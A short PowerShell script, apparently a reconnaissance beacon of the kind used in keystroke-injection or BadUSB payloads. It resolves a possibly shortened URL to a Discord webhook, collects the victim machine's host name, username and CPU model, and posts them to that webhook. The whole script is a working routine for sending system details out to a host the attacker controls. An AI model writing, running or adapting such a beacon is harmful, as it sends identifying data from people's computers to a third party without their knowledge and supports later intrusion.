# works for shortened urls and discord webhooks yeeeeet
$w = $args[0]
if ($w -notmatch '^https://discord') {
    $response = irm $w
    if ($response.url) {
        $w = $response.url
    } else {
        $w = $response
    }
}
$sys = Get-ComputerInfo
$cpu = (Get-CimInstance Win32_Processor).Name
$data = @{
    content = "### :upside_down::upside_down::upside_down:`n**Host:** $($sys.CsName)`n**User:** $env:USERNAME`n**CPU:** $cpu"
}
irm $w -Method Post -Body ($data | ConvertTo-Json) -ContentType "application/json"
